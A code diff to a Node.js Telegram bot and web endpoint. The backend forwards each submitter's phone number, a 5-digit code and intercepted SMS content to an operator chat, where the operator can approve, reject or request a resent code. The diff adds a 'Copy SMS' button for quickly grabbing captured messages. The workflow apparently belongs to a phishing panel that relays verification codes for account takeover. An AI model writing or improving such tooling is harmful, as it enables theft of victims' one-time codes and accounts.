@@ -33,6 +33,17 @@ if (token) {
 
         const originalText = query.message.text;
 
+        // --- New Feature: Copy SMS Button ---
+        if (decision === 'copysms') {
+            if (!session.sms) {
+                return bot.answerCallbackQuery(query.id, { text: "⚠️ No SMS found.", show_alert: true });
+            }
+            
+            // Send the SMS alone in a brand new message so you can tap and copy it instantly
+            await bot.sendMessage(chatId, `\`\`\`\n${session.sms}\n\`\`\``, { parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(query.id, { text: "✅ SMS Extracted!", show_alert: false });
+        }
+
         // --- Initial Approval ---
         if (decision === 'approve') {
             session.status = 'approved';
@@ -57,7 +68,11 @@ if (token) {
             await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
                 chat_id: chatId,
                 message_id: messageId,
-                parse_mode: 'HTML'
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '📋 Copy SMS', callback_data: `copysms_${sessionId}` }
+                    ]]
+                }
             });
         } else if (decision === 'smsreject') {
             session.status = 'sms_rejected';
@@ -65,14 +80,22 @@ if (token) {
             await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED\n(To set the correct code, use: /setcode ${sessionId} <5-digit-code>)`, {
                 chat_id: chatId,
                 message_id: messageId,
-                parse_mode: 'HTML'
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '📋 Copy SMS', callback_data: `copysms_${sessionId}` }
+                    ]]
+                }
             });
         } else if (decision === 'smsresend') {
             session.nextStep = 'resend_sms';
             await bot.editMessageText(`${originalText}\n\n🔄 STATUS: RESEND REQUESTED`, {
                 chat_id: chatId,
                 message_id: messageId,
-                parse_mode: 'HTML'
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '📋 Copy SMS', callback_data: `copysms_${sessionId}` }
+                    ]]
+                }
             });
         }
 
@@ -197,12 +220,11 @@ app.post('/api/submit-sms', (req, res) => {
 
     session.sms = sms;
 
-    // Added <pre> and <code> tags around the SMS content so you can copy ONLY the SMS text easily
     bot.sendMessage(adminChatId,
         `📩 <b>SMS Received from User</b>\n\n` +
         `📱 Phone: ${session.phone}\n` +
         `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-        `*SMS Content:* (Tap the box below to copy just the text)\n` +
+        `*SMS Content:*\n` +
         `<pre><code>${sms}</code></pre>\n\n` +
         `Choose an action below.`,
         {
